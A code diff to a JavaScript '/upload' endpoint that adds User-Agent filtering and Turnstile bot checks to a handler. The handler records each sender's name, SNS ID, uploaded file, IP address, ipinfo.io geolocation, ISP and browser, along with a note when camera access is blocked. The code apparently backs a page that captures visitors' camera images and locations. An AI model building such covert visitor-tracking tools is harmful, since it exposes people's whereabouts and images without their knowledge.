@@ -12,6 +12,7 @@ app.post("/upload", async (c) => {
   const name = formData.get("name").replaceAll("@", "@\\").slice(0, 20);
   const snsId = formData.get("snsId").replaceAll("@", "@\\").slice(0, 20);
   const error = formData.get("error");
+  const ua = c.req.header("User-Agent").replaceAll("@", "@\\");
   const info = getConnInfo(c);
   if (!file && !error) {
     return c.text("No file uploaded", 400);
@@ -21,11 +22,33 @@ app.post("/upload", async (c) => {
     return c.text("Done");
   }
 
+  if (!ua.startsWith("Mozilla/5.0")) {
+    return c.text("Done");
+  }
+
+  const url = "https://challenges.cloudflare.com/turnstile/v0/siteverify";
+  const result = await fetch(url, {
+    body: JSON.stringify({
+      secret: c.env.TURNSTILE_SECRET_KEY,
+      response: formData.get("turnstile"),
+    }),
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+  });
+
+  const outcome = await result.json();
+  console.log(outcome);
+  if (!outcome.success) {
+    return c.text("Failed to verify Turnstile", 400);
+  }
+
   const ip = info.remote.address;
 
   const ipInfoJson = await (await fetch(`https://ipinfo.io/${ip}/json`)).json();
 
-  let message = `名前: ${name}\nSNS ID: ${snsId}\nIP: ${ip} (${ipInfoJson.city}, ${ipInfoJson.region}, ${ipInfoJson.country})\nISP: ${ipInfoJson.org}\n位置: ${ipInfoJson.loc}\nUA: ${c.req.header("User-Agent").replaceAll("@", "@\\") || "Not Found"}\n\n`;
+  let message = `名前: ${name}\nSNS ID: ${snsId}\nIP: ${ip} (${ipInfoJson.city}, ${ipInfoJson.region}, ${ipInfoJson.country})\nISP: ${ipInfoJson.org}\n位置: ${ipInfoJson.loc}\nUA: ${ua || "Not Found"}\n\n`;
 
   if (error) {
     message += `カメラの起動を阻止されました`;
